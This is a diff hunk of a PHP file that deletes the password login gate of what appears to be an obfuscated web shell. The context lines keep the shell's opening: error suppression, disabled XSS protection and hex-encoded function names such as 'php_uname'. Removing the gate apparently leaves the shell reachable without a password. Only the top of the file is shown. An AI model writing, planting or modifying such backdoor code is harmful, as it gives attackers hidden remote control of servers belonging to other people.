@@ -1,30 +1,3 @@
-<?php
-$indexphp_pass = "89dabfc6a51966f8d9184ea4c8497909"; // 
-session_start();
-@error_reporting(0);
-@set_time_limit(0);
-function Login() {
-?>
-<html>
-<head>
-</style>
-<center>
-<form method="post">
-<font face ='comic sans ms' size='3' color='black'>Password :
-<input type="password" name="pass">
-	<input type="submit" value="Login">
-</form>
-<?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-    if( empty($indexphp_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $indexphp_pass) ) )
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    else
-        Login();
-?>
-
-
 <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
 $Array = [
 		'7068705f756e616d65',
